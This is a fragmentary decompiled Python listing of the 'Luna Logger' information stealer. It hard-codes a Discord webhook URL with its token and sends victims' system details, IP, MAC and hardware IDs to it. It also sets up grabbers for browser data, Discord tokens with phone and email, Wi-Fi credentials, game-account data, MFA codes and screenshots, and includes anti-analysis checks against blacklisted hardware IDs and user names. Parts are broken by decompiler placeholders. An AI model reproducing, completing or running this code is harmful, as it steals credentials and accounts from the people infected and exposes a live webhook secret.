...
__WEBHOOK__ = 'https://discord.com/api/webhooks/1028620246162100286/qav0aHkXaiyQtXxlsRDxLE0PFv1xl_WTA6_i01SeyixEzXE1y-xNfYRamJF6mVkZiw4m'
__PING__ = True
...
def main(webhook = None):
    webhook = SyncWebhook.from_url(webhook, requests.Session(), **('session',))
    threads = [
        browsers,
        ss,
        grabwifi,
...
class grabpcinfo:
    ...
    def get_inf(self, webhook):
        webhook = SyncWebhook.from_url(webhook, requests.Session(), **('session',))
        embed = Embed('Luna Logger', 5639644, **('title', 'color'))
        computer_os = platform.platform()
        cpu = wmi.WMI().Win32_Processor()[0]
        gpu = wmi.WMI().Win32_VideoController()[0]
        ram = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)
        embed.add_field('System Info', f'''\xf0\x9f\x92\xbb `PC Username:` **{username}**\n:desktop: `PC Name:` **{hostname}**\n\xf0\x9f\x8c\x90 `OS:` **{computer_os}**\n\n\xf0\x9f\x91\x80 `IP:` **{ip}**\n\xf0\x9f\x8d\x8f `MAC:` **{mac}**\n\xf0\x9f\x94\xa7 `HWID:` **{hwid}**\n\n<:cpu:1024720072075399250> `CPU:` **{cpu.Name}**\n<:gpu:1024720328062156892> `GPU:` **{gpu.Name}**\n<:rgbram:1024720542214930462> `RAM:` **{ram}GB**''', False, **('name', 'value', 'inline'))
        embed.set_footer('Luna Logger | Created by Smug', **('text',))
        embed.set_thumbnail('https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096', **('url',))
        webhook.send(embed, 'https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096', 'Luna', **('embed', 'avatar_url', 'username'))
...
class grabtokens:
    ...
    def upload(self, webhook):
        ...
        phone = r['phone']
        email = r['email']
        embed = Embed(username, 5639644, **('title', 'color'))
    # WARNING: Decompyle incomplete


browsers = try_extract(<NODE:12>)

def ss():
    ImageGrab.grab(None, False, True, None, **('bbox', 'include_layered_windows', 'all_screens', 'xdisplay')).save('desktop-screenshot.png')

grabwifi = try_extract(<NODE:12>)
mc_tokens = try_extract(<NODE:12>)
epicgames_data = try_extract(<NODE:12>)
mfa_codes = try_extract(<NODE:12>)
...
class debug:
    ...
    def get_system(self = None):
        ...
        if hwid in self.blackListedHWIDS:
            return True
        if None in self.blackListedUsers:
            return True
        if None in self.blackListedPCNames:
            return True
